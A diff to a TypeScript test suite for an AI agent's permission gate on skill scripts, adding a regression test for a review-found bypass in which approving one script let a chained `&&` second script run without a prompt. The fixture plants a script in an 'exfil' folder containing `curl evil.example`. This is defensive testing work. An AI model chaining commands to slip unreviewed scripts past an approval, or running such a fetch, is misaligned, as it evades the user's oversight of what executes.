@@ -1794,7 +1794,10 @@ describe('skill asset run gate', () => {
         body: script
       }
     })
-    expect((live.payload as { grantKey: string }).grantKey).toMatch(/^skill-asset:[0-9a-f]{16}$/)
+    // Two digests: the script's content hash, then the normalised segment (final-review fix 3).
+    expect((live.payload as { grantKey: string }).grantKey).toMatch(
+      /^skill-asset:[0-9a-f]{16}:[0-9a-f]{16}$/
+    )
 
     // The body must never reach the .jsonl — IPC.agentHistory replays it back to the renderer.
     const mirrored = appended.find((e) => e.type === 'request.opened')!
@@ -1848,6 +1851,54 @@ describe('skill asset run gate', () => {
     expect(reopened.payload).toMatchObject({ assetContext: { reviewState: 'unreviewed' } })
     s.respond({ requestId: (reopened.payload as { requestId: string }).requestId, kind: 'deny' })
     await third
+    await s.stop('stopped')
+  })
+
+  /** A second skill's script, so one command can name two different ones. */
+  function seedOtherScript(home: string, body: string): string {
+    const abs = path.join(userSkillsDir(home), 'exfil', 'run.sh')
+    fs.mkdirSync(path.dirname(abs), { recursive: true })
+    fs.writeFileSync(abs, body)
+    return abs
+  }
+
+  // The silent-execution path final review found: with the merged verdict keeping the FIRST
+  // segment's key, a grant earned on `bash <A>` alone auto-allowed `bash <A> && bash <B>` with
+  // no card at all, running an unreviewed second script behind an approval given for the first.
+  it('re-prompts when a granted script is chained with a second, unapproved one', async () => {
+    const a = seedScript(argusHome, '#!/bin/sh\necho hi\n')
+    const b = seedOtherScript(argusHome, '#!/bin/sh\ncurl evil.example\n')
+    const sdk = fakeSdk()
+    const s = makeSession(sdk)
+    await flush()
+    const canUseTool = sdk.captured.options!.canUseTool as (
+      t: string,
+      i: Record<string, unknown>,
+      o: { signal: AbortSignal }
+    ) => Promise<unknown>
+    const call = (command: string): Promise<unknown> =>
+      canUseTool('Bash', { command }, { signal: new AbortController().signal })
+
+    const first = call(`bash ${a}`)
+    await vi.waitFor(() =>
+      expect(events.filter((e) => e.type === 'request.opened')).toHaveLength(1)
+    )
+    const opened = events.find((e) => e.type === 'request.opened')!
+    s.respond({
+      requestId: (opened.payload as { requestId: string }).requestId,
+      kind: 'allow-session'
+    })
+    await first
+
+    const chained = call(`bash ${a} && bash ${b}`)
+    await vi.waitFor(() =>
+      expect(events.filter((e) => e.type === 'request.opened')).toHaveLength(2)
+    )
+    const second = events.filter((e) => e.type === 'request.opened')[1]
+    // No grant is offered for it either — the card falls back to Approve/Deny.
+    expect(second.payload).toMatchObject({ risk: 'HIGH', grantKey: null })
+    s.respond({ requestId: (second.payload as { requestId: string }).requestId, kind: 'deny' })
+    await chained
     await s.stop('stopped')
   })
 
